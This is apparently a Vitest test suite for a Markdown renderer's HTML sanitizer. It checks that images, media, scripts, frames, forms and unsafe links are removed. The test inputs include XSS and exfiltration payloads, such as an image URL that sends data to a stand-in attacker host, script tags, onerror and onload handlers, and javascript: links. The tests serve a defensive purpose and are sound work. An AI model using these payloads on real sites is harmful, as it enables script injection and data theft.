import { describe, expect, it } from "vitest";
import { markdownToPlainText, renderMarkdown } from "./markdown";

describe("renderMarkdown", () => {
  it("renders basic Markdown", () => {
    const html = renderMarkdown("**bold** and [link](https://example.com)");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain('href="https://example.com"');
  });

  it("drops remote images (zero-click exfiltration channel)", () => {
    const html = renderMarkdown(
      'hi ![](https://attacker.example/p.png?d=abc) <img src="https://a.example/x"> <img srcset="https://a.example/y 1x">',
    );
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).not.toContain("a.example");
    expect(html).toContain("hi");
  });

  it("drops other auto-loading media and URL attributes", () => {
    const html = renderMarkdown(
      '<video poster="https://a.example/p.png"><source src="https://a.example/v.mp4"></video>' +
        '<audio src="https://a.example/a.mp3"></audio><picture><source srcset="https://a.example/s"></picture>' +
        '<table background="https://a.example/bg.png"><tr><td>x</td></tr></table>',
    );
    expect(html).not.toMatch(/<(video|audio|source|picture)\b/);
    expect(html).not.toContain("a.example");
    expect(html).toContain("<td>x</td>");
  });

  it("still strips scripts and event handlers", () => {
    const html = renderMarkdown('<script>alert(1)</script><a href="#" onclick="x()">a</a>');
    expect(html).not.toContain("<script");
    expect(html).not.toContain("onclick");
  });
});

describe("markdownToPlainText", () => {
  it("removes image syntax and keeps link text", () => {
    expect(markdownToPlainText("see ![x](https://a/b.png) [docs](https://d)")).toBe("see  docs");
  });
});

describe("renderMarkdown (sanitizer allowlist)", () => {
  it("drops javascript:/data: links but keeps safe ones", () => {
    const html = renderMarkdown(
      '[a](javascript:alert(1)) <a href="data:text/html,x">b</a> <a href="//evil.example/x">c</a> [d](#anchor) [e](mailto:x@example.com)',
    );
    expect(html).not.toMatch(/javascript:|data:text|evil\.example/);
    expect(html).toContain('href="#anchor"');
    expect(html).toContain('href="mailto:x@example.com"');
  });

  it("removes frames, forms, svg, styles and their content", () => {
    const html = renderMarkdown(
      '<iframe src="https://a.example"></iframe><form action="/x"><input name="q"></form>' +
        '<svg onload="x()"><script>1</script></svg><style>body{display:none}</style><p style="color:red">ok</p>',
    );
    expect(html).not.toMatch(/<(iframe|form|input|svg|style|script)\b/);
    expect(html).not.toContain("display:none");
    expect(html).not.toContain("style=");
    expect(html).toContain("<p>ok</p>");
  });

  it("keeps GFM tables, code language classes and task-list text", () => {
    const html = renderMarkdown("| a | b |\n|:-|-:|\n| 1 | 2 |\n\n```ts\nconst x = 1;\n```\n\n- [x] done");
    expect(html).toContain("<table>");
    expect(html).toMatch(/<td( align="left")?>1<\/td>/);
    expect(html).toContain('<code class="language-ts">');
    expect(html).not.toContain("<input");
    expect(html).toContain("done");
  });

  it("escapes text that looks like markup inside code", () => {
    const html = renderMarkdown("`<img src=x onerror=alert(1)>`");
    expect(html).toContain("&lt;img");
    expect(html).not.toContain("<img");
  });
});
